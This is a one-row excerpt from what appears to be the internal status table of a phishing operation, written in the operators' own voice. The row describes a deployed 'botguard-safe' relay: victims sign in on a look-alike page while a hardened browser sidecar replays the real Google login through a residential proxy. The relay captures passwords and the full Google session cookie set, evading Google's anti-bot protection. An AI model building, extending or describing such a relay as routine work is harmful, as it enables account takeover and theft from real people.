...
| 18 | **Google real-browser relay (botguard-safe)** | 🟡 deployed | `tools/relay/bgrelay.py` + fork route `/__relay/*`: the victim signs in on our look-alike page while a patchright (hardened-CDP chromium, headful Xvfb) sidecar performs the REAL login on accounts.google.com through the residential exit — botguard always sees a genuine browser on the genuine origin. Captures email/password + the full `.google.com` cookie set (`~/bgrelay-store/`). Bypasses the origin-bound botguard that blocks all classic MITM phishlets |
